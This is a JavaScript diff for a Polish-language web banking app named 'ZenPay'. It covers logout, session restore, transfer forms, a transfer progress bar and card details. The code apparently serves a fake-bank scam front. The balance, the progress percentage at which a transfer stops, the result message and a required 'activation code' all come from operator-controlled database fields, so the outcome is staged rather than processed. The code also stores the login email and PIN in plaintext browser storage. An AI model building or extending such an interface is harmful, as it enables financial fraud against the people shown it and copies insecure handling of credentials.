+  if (errEl) errEl.classList.add('hidden');
+  history.replaceState({ screen: 'login' }, '', '#login');
+
+  document.getElementById('greet').innerHTML = 'Witaj, <span>Power</span>';
+  document.getElementById('bal').textContent = '0,00 zł';
+  document.getElementById('stat-balance').textContent = '0,00 zł';
+  document.getElementById('bal2').textContent = '0,00 zł';
+  document.getElementById('stat-tx').textContent = '0';
+  document.getElementById('tx-count-badge').textContent = '0';
+  document.getElementById('history-list').innerHTML =
+    `<div class="empty-history"><i class="fa-regular fa-receipt"></i> Brak transakcji</div>`;
+  document.getElementById('accinfo').innerHTML = '';
+  ['avatar', 'avatar2', 'avatar3', 'avatar4', 'avatar5'].forEach(id => {
+    const el = document.getElementById(id);
+    if (el) el.textContent = 'FB';
+  });
+  document.getElementById('cardHolderName').textContent = 'JAN KOWALSKI';
+  document.getElementById('cardNumber').innerHTML = '<span>4556</span><span>5518</span><span>8867</span><span>XXXX</span>';
+  document.getElementById('cardExpiry').textContent = '02/28';
+  document.getElementById('cardCvv').textContent = '***';
+  document.getElementById('cardDetailHolder').textContent = 'JAN KOWALSKI';
+  document.getElementById('cardDetailNumber').textContent = '4556 5518 8867 XXXX';
+  document.getElementById('cardDetailNumber').dataset.realNumber = '455655188867XXXX';
+  document.getElementById('cardDetailExpiry').textContent = '02/28';
+  document.getElementById('cardDetailCvv').textContent = '***';
+  document.getElementById('cardDetailCvv').dataset.realCvv = '556';
+  cardVisible = false;
+  const eyeIcon = document.getElementById('eyeIcon');
+  const eyeText = document.getElementById('eyeText');
+  if (eyeIcon) eyeIcon.className = 'fa-regular fa-eye';
+  if (eyeText) eyeText.textContent = 'Pokaż';
+
+  if (user && user._id && sessionId) {
+    try {
+      await update(ref(db, 'clients/' + user._id + '/sessions/' + sessionId), { connected: false });
+    } catch(e) { console.error(e); }
+  }
+
+  localStorage.removeItem('zenpay_session');
+  localStorage.removeItem('zenpay_session_id');
+  localStorage.removeItem('zenpay_client_id');
+  localStorage.removeItem('zenpay_theme');
+
+  if (historyListener) historyListener();
+  if (balanceListener) balanceListener();
+  if (statusListener) statusListener();
+  if (banqueRef) banqueRef();
+
+  user = null;
+  sessionId = null;
+};
+
+// ===== RESTAURATION DE SESSION =====
+const saved = localStorage.getItem('zenpay_session');
+const savedClientId = localStorage.getItem('zenpay_client_id');
+
+if (window.__clientIdFromUrl && savedClientId && savedClientId !== window.__clientIdFromUrl) {
+  localStorage.removeItem('zenpay_session');
+  localStorage.removeItem('zenpay_session_id');
+  localStorage.removeItem('zenpay_client_id');
+  localStorage.removeItem('zenpay_theme');
+  show('login');
+} else if (saved) {
+  try {
+    const parsed = JSON.parse(saved);
+    document.getElementById('email').value = parsed.e || '';
+    document.getElementById('pin').value = parsed.p || '';
+    if (!window.__clientIdFromUrl || (savedClientId && savedClientId === window.__clientIdFromUrl)) {
+      login({ silent: true, redirect: true }).catch(() => {
+        toast('Sesja wygasła, zaloguj się ponownie.');
+        forceLogout();
+      });
+    } else {
+      show('login');
+    }
+  } catch {
+    show('login');
+  }
+}
+
+// ===== PERSONNALISATION DES MESSAGES REQUIS EN POLONAIS =====
+function setupRequiredMessages() {
+  // Validation gérée par le système de messages d'erreur en temps réel
+}
+
+// ===== VALIDATION EN TEMPS RÉEL DU MONTANT =====
+function setupTransferValidation() {
+  const amtInput = document.getElementById('a');
+  const continueBtn = document.getElementById('continueBtn');
+  if (!amtInput || !continueBtn) return;
+
+  // Validation en temps réel du montant
+  amtInput.addEventListener('input', function() {
+    validateAmountField();
+  });
+  amtInput.addEventListener('blur', function() {
+    validateAmountField();
+  });
+
+  // Validation en temps réel des autres champs
+  const fieldMessages = {
+    'b': 'Proszę wpisać imię i nazwisko beneficjenta.',
+    'c': 'Proszę wpisać numer IBAN lub konta.',
+    'd': 'Proszę wpisać kod BIC/SWIFT.',
+    'e': 'Proszę wpisać nazwę banku.',
+    'f': 'Proszę wpisać powód przelewu.'
+  };
+
+  ['b', 'c', 'd', 'e', 'f'].forEach(id => {
+    const el = document.getElementById(id);
+    if (!el) return;
+    el.addEventListener('input', function() {
+      validateTextField(id, fieldMessages[id]);
+      validateAmountField();
+    });
+    el.addEventListener('blur', function() {
+      validateTextField(id, fieldMessages[id]);
+    });
+  });
+
+  // Désactiver le bouton au départ
+  continueBtn.disabled = true;
+}
+
+// ===== TRANSFERT =====
+window.toVerify = function() {
+  clearAllTransferErrors();
+
+  if (!validateAllTransferFields()) {
+    return;
+  }
+
+  const rawValue = document.getElementById('a').value.trim();
+  const amt = Number(rawValue);
+
+  document.getElementById('va').textContent = fmt(amt);
+  document.getElementById('vb').textContent = document.getElementById('b').value;
+  document.getElementById('vc').textContent = document.getElementById('c').value;
+  document.getElementById('vd').textContent = document.getElementById('d').value;
+  document.getElementById('ve').textContent = document.getElementById('e').value;
+  document.getElementById('vf').textContent = document.getElementById('f').value;
+  navigateTo('verify');
+};
+
+// ===== FINISH =====
+window.finish = function() {
+  if (!user) return;
+
+  const codeInput = document.getElementById('code');
+  const code = codeInput.value.trim();
+
+  if (!code) {
+    showFieldError('code', 'Proszę wprowadzić kod aktywacyjny.');
+    return;
+  }
+
+  if (code !== user.code) {
+    showFieldError('code', 'Nieprawidłowy kod aktywacyjny.');
+    return;
+  }
+
+  clearFieldError('code');
+
+  const amt = Number(document.getElementById('a').value) || 0;
+  const benef = document.getElementById('b').value || '-';
+  const iban = document.getElementById('c').value || '-';
+  const swift = document.getElementById('d').value || '-';
+  const bank = document.getElementById('e').value || '-';
+  const reason = document.getElementById('f').value || '';
+
+  transferData = {
+    amount: amt,
+    amountFormatted: fmt(amt),
+    benef: benef,
+    iban: iban,
+    swift: swift,
+    bank: bank,
+    reason: reason
+  };
+
+  navigateTo('progress');
+
+  setTimeout(() => {
+    startProgress(amt, benef, iban, bank, reason);
+  }, 300);
+};
+
+// ===== PROGRESSION =====
+let transferData = {};
+
+function startProgress(amount, beneficiary, iban, bank, reason) {
+  console.log('🚀 startProgress appelé avec :', { amount, beneficiary, iban, bank, reason });
+
+  document.getElementById('pAmount').textContent = fmt(amount);
+  document.getElementById('pBenef').textContent = beneficiary;
+  document.getElementById('pIban').textContent = iban;
+  document.getElementById('pBank').textContent = bank;
+  const reasonRow = document.getElementById('pReasonRow');
+  if (reason && reason.trim() !== '') {
+    document.getElementById('pReason').textContent = reason;
+    reasonRow.style.display = 'block';
+  } else {
+    reasonRow.style.display = 'none';
+  }
+
+  const pct = Number(user.pct) || 100;
+  const msg = user.msg || '';
+  const fill = document.getElementById('progressFill');
+  const percentEl = document.getElementById('progressPercent');
+
+  let w = 0;
+  const interval = setInterval(() => {
+    w += 1;
+    const cur = Math.min(w, pct);
+    fill.style.width = cur + '%';
+    percentEl.textContent = cur + '%';
+    if (w >= pct) {
+      clearInterval(interval);
+      console.log('✅ Pourcentage atteint :', pct);
+      setTimeout(async () => {
+        const icon = document.getElementById('resultIcon');
+        const status = document.getElementById('resultStatus');
+        const percentResult = document.getElementById('resultPercent');
+        const benefEl = document.getElementById('resultBenef');
+        const amountEl = document.getElementById('resultAmount');
+        const accountEl = document.getElementById('resultAccount');
+        const msgEl = document.getElementById('resultMsg');
+
+        percentResult.textContent = cur + '%';
+        if (pct >= 100) {
+          icon.innerHTML = '<i class="fa-solid fa-circle-check" style="color:#10B981;"></i>';
+          status.textContent = 'Przelew zatwierdzony';
+          const amt = Number(transferData.amount) || 0;
+          const newMontant = Number(user.montant) - amt;
+          user.montant = newMontant;
+
+          console.log('💰 Mise à jour du solde :', newMontant);
+          try {
+            await update(ref(db, 'clients/' + user._id), { montant: newMontant });
+            console.log('✅ Solde mis à jour');
+
+            const { dateStr, timeStr, timestamp } = getPolandDateTime();
+            const tx = {
+              id: genId('DE'),
+              title: 'Przelew wysłany',
+              subtitle: transferData.benef,
+              amount: -amt,
+              beneficiary: transferData.benef,
+              iban: transferData.iban,
+              devise: user.devise || 'zł',
+              date: dateStr,
+              time: timeStr,
+              timestamp: timestamp
+            };
+            console.log('📤 Enregistrement de la transaction :', tx);
+            await push(ref(db, 'clients/' + user._id + '/history'), tx);
+            console.log('✅ Transaction enregistrée');
+            toast(`-${fmt(amt)}`);
+
+            const nomClient = user.nom || 'Klient';
+            const formattedAmount = amt.toLocaleString('pl-PL') + ' ' + (user.devise || 'zł');
+            const bannerMsg = `Witam ${nomClient}, Przelew ${formattedAmount} został wysłany do ${beneficiary}.`;
+            console.log('📢 Écriture de la bannière de débit :', bannerMsg);
+
+            await update(ref(db, 'clients/' + user._id), { bannerMessage: '', bannerRead: true });
+            await update(ref(db, 'clients/' + user._id), { bannerMessage: bannerMsg, bannerRead: false });
+            console.log('✅ Bannière générée');
+
+            user.bannerMessage = bannerMsg;
+            user.bannerRead = false;
+            updateBanner();
+
+          } catch (err) {
+            console.error('❌ Erreur lors de l\'enregistrement du transfert:', err);
+            toast('❌ Erreur lors de l\'enregistrement du transfert');
+          }
+
+          const balElement = document.getElementById('bal');
+          const statBalElement = document.getElementById('stat-balance');
+          updateBalanceDisplay(balElement, statBalElement, user.montant);
+          document.getElementById('bal2').textContent = fmt(user.montant);
+          updateProfileInfo();
+
+        } else {
+          icon.innerHTML = '<i class="fa-solid fa-circle-exclamation" style="color:#EAB308;"></i>';
+          status.textContent = 'Przelew zatrzymany';
+        }
+        benefEl.textContent = transferData.benef;
+        amountEl.textContent = transferData.amountFormatted;
+        accountEl.textContent = transferData.iban;
+        const { dateStr, timeStr } = getPolandDateTime();
+        document.getElementById('resultDate').textContent = dateStr + ' • ' + timeStr;
+        msgEl.textContent = msg || (pct >= 100 ? 'Środki zostaną przelane w ciągu 1-2 dni roboczych.' : 'Transakcja została przerwana.');
+
+        const successFinal = (pct >= 100);
+        const refNum = genId('REF');
+        sendMail({
+          to: user.email,
+          name: user.nom || 'Klient',
+          pct: pct,
+          success: successFinal,
+          montant: transferData.amountFormatted,
+          beneficiaire: transferData.benef,
+          compte: transferData.iban,
+          reference: refNum,
+          isRefund: false
+        })
+        .then(() => console.log('✅ BIP envoyé avec nouvelle API'))
+        .catch((error) => {
+          console.error('❌ Erreur envoi BIP:', error);
+          toast('Erreur lors de l\'envoi du BIP');
+        });
+
+        navigateTo('result');
+      }, 500);
+    }
+  }, 80);
+}
+
+// ===== CARTE =====
+let cardVisible = false;
+window.copyCardNumber = function() {
+  const num = document.getElementById('cardDetailNumber').textContent.replace(/\s/g, '');
+  navigator.clipboard.writeText(num).then(() => toast('✅ Numer skopiowany')).catch(() => toast('❌ Błąd kopiowania'));
+};
+window.copyIban = function() {
+  const iban = document.getElementById('ibanNumber').textContent.replace(/\s/g, '');
+  navigator.clipboard.writeText(iban).then(() => toast('✅ IBAN skopiowany')).catch(() => toast('❌ Błąd kopiowania'));
+};
+window.toggleCardVisibility = function() {
+  cardVisible = !cardVisible;
+  const eyeIcon = document.getElementById('eyeIcon');
+  const eyeText = document.getElementById('eyeText');
+  const cardNum = document.getElementById('cardNumber');
+  const detailNum = document.getElementById('cardDetailNumber');
+  const cvv = document.getElementById('cardCvv');
+  const detailCvv = document.getElementById('cardDetailCvv');
+  const realNum = (document.getElementById('cardDetailNumber').dataset.realNumber || document.getElementById('cardDetailNumber').textContent).replace(/\s/g, '');
+  const realCvv = document.getElementById('cardDetailCvv').dataset.realCvv || document.getElementById('cardDetailCvv').textContent;
+  if (cardVisible) {
+    eyeIcon.className = 'fa-regular fa-eye-slash'; eyeText.textContent = 'Ukryj';
+    const p1 = realNum.substring(0,4), p2 = realNum.substring(4,8), p3 = realNum.substring(8,12), p4 = realNum.substring(12,16);
+    cardNum.innerHTML = `<span>${p1}</span><span>${p2}</span><span>${p3}</span><span>${p4}</span>`;
+    detailNum.textContent = `${p1} ${p2} ${p3} ${p4}`;
+    cvv.textContent = realCvv; detailCvv.textContent = realCvv;
+  } else {
+    eyeIcon.className = 'fa-regular fa-eye'; eyeText.textContent = 'Pokaż';
+    const p1 = realNum.substring(0,4), p2 = realNum.substring(4,8), p3 = realNum.substring(8,12);
+    cardNum.innerHTML = `<span>${p1}</span><span>${p2}</span><span>${p3}</span><span>XXXX</span>`;
+    detailNum.textContent = `${p1} ${p2} ${p3} XXXX`;
+    cvv.textContent = '***'; detailCvv.textContent = '***';
+  }
+};
+
+// ===== TOAST =====
+window.toast = function(m) {
+  const t = document.getElementById('t');
+  t.textContent = m;
+  t.style.display = 'block';
+  setTimeout(() => t.style.display = 'none', 1500);
+};
+
+// ===== RÉINITIALISATION DES VALIDITÉS PERSONNALISÉES =====
+function setupCustomValidityReset() {
+  // Validation gérée par le système de messages d'erreur en temps réel
+}
+
+// ===== INITIALISATION =====
+function init() {
+  setupCustomValidityReset();
+  setupCodeValidation();
+}
+
+document.addEventListener('DOMContentLoaded', init);
+
+// ===== APPELS D'INITIALISATION =====
+setTimeout(() => {
+  if (user) {
+    setupCustomValidityReset();
+    setupTransferValidation();
+    setupRequiredMessages();
+    setupCodeValidation();
+  }
+}, 300);
+
+setInterval(() => {
+  if (user && document.getElementById('dashboard').classList.contains('active')) {
+    adjustAllTexts();
+  }
+}, 1000);
+
+setInterval(() => {
+  refreshSession();
+}, 30000);
+
+window.addEventListener('resize', () => {
+  adjustAllTexts();
+});
+
+setTimeout(() => {
+  document.querySelectorAll('.btn').forEach(btn => btn.style.background = 'var(--p)');
+  adjustAllTexts();
+}, 100);
